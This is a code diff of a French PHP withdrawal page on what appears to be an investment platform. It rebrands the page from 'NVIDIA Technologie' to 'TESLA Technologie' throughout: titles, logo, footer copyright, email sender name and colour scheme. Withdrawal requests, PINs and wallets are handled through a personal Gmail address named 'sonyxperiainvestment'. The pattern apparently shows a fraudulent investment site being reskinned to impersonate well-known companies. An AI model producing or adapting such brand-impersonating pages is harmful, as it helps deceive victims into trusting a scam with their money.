@@ -177,7 +177,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['demander_retrait'])) {
                     $mail->CharSet = 'UTF-8';
                     
                     // Destinataires
-                    $mail->setFrom('sonyxperiainvestment@gmail.com', 'NVIDIA Technologie');
+                    $mail->setFrom('sonyxperiainvestment@gmail.com', 'TESLA Technologie');
                     $mail->addAddress('sonyxperiainvestment@gmail.com'); // Votre email admin
                     
                     // Contenu de l'email
@@ -194,9 +194,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['demander_retrait'])) {
                         <style>
                             body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
                             .container { max-width: 600px; margin: 0 auto; padding: 20px; }
-                            .header { background: linear-gradient(135deg, #76B900, #4A7500); color: white; padding: 20px; text-align: center; }
+                            .header { background: linear-gradient(135deg, #E82127, #4A7500); color: white; padding: 20px; text-align: center; }
                             .content { background: #f9f9f9; padding: 20px; border-radius: 5px; }
-                            .info-box { background: white; padding: 15px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #76B900; }
+                            .info-box { background: white; padding: 15px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #E82127; }
                             .button { display: inline-block; padding: 12px 24px; margin: 10px 5px; color: white; text-decoration: none; border-radius: 5px; font-weight: bold; }
                             .button-validate { background: #38B000; }
                             .button-reject { background: #D00000; }
@@ -250,7 +250,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['demander_retrait'])) {
                             </div>
                             
                             <div class="footer">
-                                <p>© ' . date('Y') . ' NVIDIA Technologie. Tous droits réservés.</p>
+                                <p>© ' . date('Y') . ' TESLA Technologie. Tous droits réservés.</p>
                             </div>
                         </div>
                         
@@ -290,7 +290,7 @@ include 'menu.php';
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retrait - NVIDIA Technologie</title>
+    <title>Retrait - TESLA Technologie</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
     :root {
@@ -298,7 +298,7 @@ include 'menu.php';
         --soft-white: #f8fafc;
         --warm-white: #fefefe;
         --light-gray: #f1f5f9;
-        --accent-green: #76B900; /* NVIDIA Green */
+        --accent-green: #E82127; /* TESLA Green */
         --green-light: #9BC930;
         --green-dark: #4A7500;
         --accent-gray: #303030; /* Darker accent for contrast */
@@ -336,7 +336,7 @@ include 'menu.php';
     
     /* Arrière-plan géométrique / accents */
     .background, .geometric-pattern, .blue-accent, .purple-accent {
-        display: none; /* Simplification du fond pour le thème NVIDIA */
+        display: none; /* Simplification du fond pour le thème TESLA */
     }
 
     /* Nouveau fond sombre avec accent vert */
@@ -356,7 +356,7 @@ include 'menu.php';
         left: 50%;
         width: 600px;
         height: 600px;
-        background: radial-gradient(circle, rgba(118, 185, 0, 0.15) 0%, transparent 70%);
+        background: radial-gradient(circle, rgba(232, 33, 39, 0.15) 0%, transparent 70%);
         filter: blur(100px);
         transform: translate(-50%, -50%);
         z-index: -1;
@@ -374,7 +374,7 @@ include 'menu.php';
         animation: headerSlide 1s ease-out;
         border-radius: 0 0 20px 20px;
         /* Ombre modifiée */
-        box-shadow: 0 8px 25px rgba(118, 185, 0, 0.3);
+        box-shadow: 0 8px 25px rgba(232, 33, 39, 0.3);
     }
     
     .header::before {
@@ -433,7 +433,7 @@ include 'menu.php';
     .logo-icon {
         width: 45px;
         height: 45px;
-        background: var(--accent-green); /* Vert NVIDIA */
+        background: var(--accent-green); /* Rouge TESLA */
         border: none;
         border-radius: 12px;
         display: flex;
@@ -442,7 +442,7 @@ include 'menu.php';
         color: #000000; /* Texte noir sur vert */
         font-weight: bold;
         font-size: 18px;
-        box-shadow: 0 8px 25px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 8px 25px rgba(232, 33, 39, 0.4);
         transition: all 0.3s ease;
         position: relative;
         overflow: hidden;
@@ -517,7 +517,7 @@ include 'menu.php';
         border-radius: 16px;
         padding: 25px;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         margin-bottom: 20px;
         transition: var(--transition);
         color: var(--soft-white);
@@ -531,7 +531,7 @@ include 'menu.php';
     .info-card h2 {
         font-size: 18px;
         font-weight: 700;
-        color: var(--accent-green); /* NVIDIA Green */
+        color: var(--accent-green); /* TESLA Green */
         margin-bottom: 15px;
         display: flex;
         align-items: center;
@@ -550,7 +550,7 @@ include 'menu.php';
         border-radius: 16px;
         padding: 25px;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         margin-bottom: 20px;
         animation: fadeInUp 1.2s ease-out;
         color: var(--soft-white);
@@ -574,18 +574,18 @@ include 'menu.php';
     .form-input {
         width: 100%;
         padding: 15px;
-        border: 1px solid rgba(118, 185, 0, 0.3);
+        border: 1px solid rgba(232, 33, 39, 0.3);
         border-radius: 10px;
         font-size: 15px;
         transition: var(--transition);
-        background: rgba(118, 185, 0, 0.1); /* Slight green tint */
+        background: rgba(232, 33, 39, 0.1); /* Slight green tint */
         color: var(--primary-white);
     }
     
     .form-input:focus {
         outline: none;
         border-color: var(--accent-green);
-        box-shadow: 0 0 0 2px rgba(118, 185, 0, 0.3);
+        box-shadow: 0 0 0 2px rgba(232, 33, 39, 0.3);
     }
     
     .pin-inputs {
@@ -601,8 +601,8 @@ include 'menu.php';
         text-align: center;
         font-size: 24px;
         font-weight: 700;
-        background: rgba(118, 185, 0, 0.1);
-        border: 1px solid rgba(118, 185, 0, 0.3);
+        background: rgba(232, 33, 39, 0.1);
+        border: 1px solid rgba(232, 33, 39, 0.3);
         border-radius: 10px;
         transition: var(--transition);
         color: var(--primary-white);
@@ -611,7 +611,7 @@ include 'menu.php';
     .pin-input:focus {
         outline: none;
         border-color: var(--accent-green);
-        box-shadow: 0 0 0 2px rgba(118, 185, 0, 0.3);
+        box-shadow: 0 0 0 2px rgba(232, 33, 39, 0.3);
     }
     
     .submit-btn {
@@ -626,12 +626,12 @@ include 'menu.php';
         transition: var(--transition);
         width: 100%;
         margin-top: 10px;
-        box-shadow: 0 4px 12px rgba(118, 185, 0, 0.3);
+        box-shadow: 0 4px 12px rgba(232, 33, 39, 0.3);
     }
     
     .submit-btn:hover {
         transform: translateY(-2px);
-        box-shadow: 0 6px 15px rgba(118, 185, 0, 0.4);
+        box-shadow: 0 6px 15px rgba(232, 33, 39, 0.4);
     }
     
     .submit-btn:disabled {
@@ -648,7 +648,7 @@ include 'menu.php';
         border-radius: 16px;
         padding: 25px;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-        border: 1px solid rgba(118, 185, 0, 0.2);
+        border: 1px solid rgba(232, 33, 39, 0.2);
         margin-bottom: 20px;
         animation: fadeInUp 1.2s ease-out;
         color: var(--soft-white);
@@ -659,7 +659,7 @@ include 'menu.php';
         justify-content: space-between;
         align-items: center;
         padding: 12px 0;
-        border-bottom: 1px solid rgba(118, 185, 0, 0.1);
+        border-bottom: 1px solid rgba(232, 33, 39, 0.1);
     }
     
     .wallet-item:last-child {
@@ -733,7 +733,7 @@ include 'menu.php';
         border-radius: 20px;
         overflow: hidden;
         animation: popupIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        box-shadow: 0 25px 50px rgba(118, 185, 0, 0.3);
+        box-shadow: 0 25px 50px rgba(232, 33, 39, 0.3);
         border: 2px solid var(--accent-green);
         max-height: 85vh;
         overflow-y: auto;
@@ -859,7 +859,7 @@ include 'menu.php';
             <div class="header-logo">
                 <div class="logo-icon">NV</div>
                 <div>
-                    <div class="logo-text">NVIDIA</div>
+                    <div class="logo-text">TESLA</div>
                     <div class="logo-subtext">Technologie</div>
                 </div>
             </div>
